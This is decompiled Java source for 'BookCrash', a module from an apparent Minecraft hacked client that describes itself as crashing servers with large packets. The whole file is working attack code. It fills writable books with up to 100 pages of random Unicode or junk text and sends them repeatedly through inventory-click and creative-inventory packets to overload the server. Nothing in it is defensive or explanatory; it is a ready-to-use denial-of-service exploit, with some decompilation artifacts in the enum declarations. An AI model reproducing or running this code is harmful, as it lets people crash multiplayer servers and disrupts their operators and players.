//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\amyan\Desktop\mcp\conf"!

//Decompiled by Procyon!

package me.noble.client.module.modules.misc;

import me.noble.client.module.*;
import me.noble.client.setting.*;
import net.minecraft.client.*;
import me.noble.client.command.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import java.util.*;
import java.util.function.*;
import java.util.stream.*;
import net.minecraft.nbt.*;
import net.minecraft.inventory.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;

@Module.Info(name = "BookCrash", category = Module.Category.MISC, description = "Crashes servers by sending large packets")
public class BookCrash extends Module
{
    private Setting<Integer> uses;
    private int currDelay;
    private Setting<Integer> pagesSettings;
    private Setting<Boolean> autoToggle;
    private Setting<Mode> mode;
    private Setting<Integer> delay;
    private Setting<FillMode> fillMode;
    
    private static String repeat(final int n, final String s) {
        return new String(new char[n]).replace("\u0000", s);
    }
    
    private static String lambda$onUpdate$1(final int n) {
        return String.valueOf((char)n);
    }
    
    public BookCrash() {
        this.mode = (Setting<Mode>)this.register((Setting)Settings.e("Mode", Mode.RAION));
        this.fillMode = (Setting<FillMode>)this.register((Setting)Settings.e("Fill Mode", FillMode.RANDOM));
        this.uses = (Setting<Integer>)this.register((Setting)Settings.i("Uses", 5));
        this.delay = (Setting<Integer>)this.register((Setting)Settings.i("Delay", 0));
        this.pagesSettings = (Setting<Integer>)this.register((Setting)Settings.i("Pages", 50));
        this.autoToggle = (Setting<Boolean>)this.register((Setting)Settings.b("AutoToggle", true));
    }
    
    private static String lambda$onUpdate$2(final int n) {
        return String.valueOf((char)n);
    }
    
    public void onUpdate() {
        if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
            Command.sendChatMessage("Not connected to a server");
            this.disable();
        }
        this.currDelay = ((this.currDelay >= this.delay.getValue()) ? 0 : (this.delay.getValue() + 1));
        if (this.currDelay > 0) {
            return;
        }
        final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound nbtTagCompound = new NBTTagCompound();
        final String s = "Bella";
        final String s2 = "\n Bella Nuzzles You \n";
        String repeat = "";
        final int min = Math.min(this.pagesSettings.getValue(), 100);
        final int n = 210;
        if (this.fillMode.getValue().equals(FillMode.RANDOM)) {
            repeat = new Random().ints(128, 1112063).map(BookCrash::lambda$onUpdate$0).limit(n * min).mapToObj((IntFunction<?>)BookCrash::lambda$onUpdate$1).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.FFFF)) {
            repeat = repeat(min * n, String.valueOf(1114111));
        }
        else if (this.fillMode.getValue().equals(FillMode.ASCII)) {
            repeat = new Random().ints(32, 126).limit(n * min).mapToObj((IntFunction<?>)BookCrash::lambda$onUpdate$2).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.OLD)) {
            repeat = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }
        for (int i = 0; i < min; ++i) {
            list.appendTag((NBTBase)new NBTTagString(repeat));
        }
        nbtTagCompound.setString("author", s);
        nbtTagCompound.setString("title", s2);
        nbtTagCompound.setTag("pages", (NBTBase)list);
        itemStack.setTagInfo("pages", (NBTBase)list);
        itemStack.setTagCompound(nbtTagCompound);
        for (int j = 0; j < this.uses.getValue(); ++j) {
            BookCrash.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, itemStack, (short)0));
            if (this.mode.getValue() == Mode.JESSICA) {
                BookCrash.mc.playerController.connection.sendPacket((Packet)new CPacketCreativeInventoryAction(0, itemStack));
            }
        }
    }
    
    private static int lambda$onUpdate$0(final int n) {
        return (n < 55296) ? n : (n + 2048);
    }
    
    private enum Mode
    {
        RAION;
        
        private static final Mode[] $VALUES;
        
        JESSICA;
        
        static {
            $VALUES = new Mode[] { Mode.JESSICA, Mode.RAION };
        }
    }
    
    private enum FillMode
    {
        FFFF;
        
        private static final FillMode[] $VALUES;
        
        ASCII, 
        OLD, 
        RANDOM;
        
        static {
            $VALUES = new FillMode[] { FillMode.ASCII, FillMode.FFFF, FillMode.RANDOM, FillMode.OLD };
        }
    }
}
